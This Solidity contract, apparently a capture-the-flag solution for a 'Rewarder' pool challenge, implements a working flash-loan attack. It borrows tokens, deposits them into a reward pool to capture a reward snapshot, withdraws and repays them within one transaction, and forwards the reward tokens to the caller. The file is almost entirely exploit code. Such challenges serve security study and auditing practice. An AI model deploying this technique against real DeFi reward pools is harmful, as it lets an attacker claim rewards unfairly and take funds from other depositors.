pragma solidity ^0.6.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract TheRewarderPoolAttacker {
    address rewarder;

    function attack(address target, address pool, uint256 amount) public {
        //rewarderPool.address
        rewarder = target; 
        //flashLoanPool and call Flashloan.
        FlashLoanerPool(pool).flashLoan(amount);
        //Get this contract reward. 
        uint256 contractReward = TheRewarderPool(target).rewardToken().balanceOf(address(this));
        //transfer reward token to caller.
        TheRewarderPool(target).rewardToken().transfer(msg.sender,contractReward);
        // give a bit of your used gas back 
        delete rewarder;
    }

    function receiveFlashLoan(uint256 amount) public {
        //approve pool liquity token
        TheRewarderPool(rewarder).liquidityToken().approve(rewarder, amount);
        // use pool to desposit token.
        TheRewarderPool(rewarder).deposit(amount);
        // withdraw amount to token contract.
        TheRewarderPool(rewarder).withdraw(amount);
        // Use token contract to send to Flashloaner Pool ??
        TheRewarderPool(rewarder).liquidityToken().transfer(msg.sender, amount);
    }
}